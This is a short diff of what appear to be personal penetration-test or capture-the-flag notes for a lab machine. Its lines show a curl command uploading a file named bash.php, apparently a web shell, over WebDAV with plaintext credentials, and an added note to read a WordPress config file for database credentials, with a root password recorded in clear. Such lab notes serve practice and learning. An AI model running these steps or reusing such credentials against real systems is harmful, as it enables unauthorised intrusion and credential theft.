@@ -250,3 +250,5 @@ tftp is ftp whitout auth.
 
 curl --upload-file bash.php http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/
 
+check wordpress config file for information about db username and password ROOT:VwPddNh7xMZyDQoByQL4 (hashed?) 
+
